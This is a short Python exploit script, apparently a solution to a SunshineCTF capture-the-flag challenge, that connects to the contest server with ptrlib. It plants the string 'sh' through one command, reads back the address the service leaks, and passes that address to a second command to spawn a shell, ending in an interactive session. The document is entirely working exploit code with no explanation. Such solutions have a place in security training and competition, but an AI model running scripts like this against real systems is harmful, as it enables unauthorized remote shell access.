from ptrlib import *

sock = Socket("rumble.sunshinectf.org", 4300)
#sock = Socket("127.0.0.1", 4300)
#_ = input()

# cmd
shellcode = b"A" + b"sh"
sock.recvuntil("> ")
sock.sendline(b"old_school " + shellcode)
sock.recvuntil("written to ")
addr_shellcode = int(sock.recvline().rstrip().rstrip(b"."), 16)
sock.recvuntil("[y/n] ")
sock.sendline("w")
dump("addr_shellcode = " + hex(addr_shellcode))

# run
shellcmd = p64(addr_shellcode + 0x1)
shellcmd = shellcmd.replace(b'\x00', b'')
sock.recvuntil("> ")
sock.sendline(b"last_ride " + shellcmd)

sock.interactive()

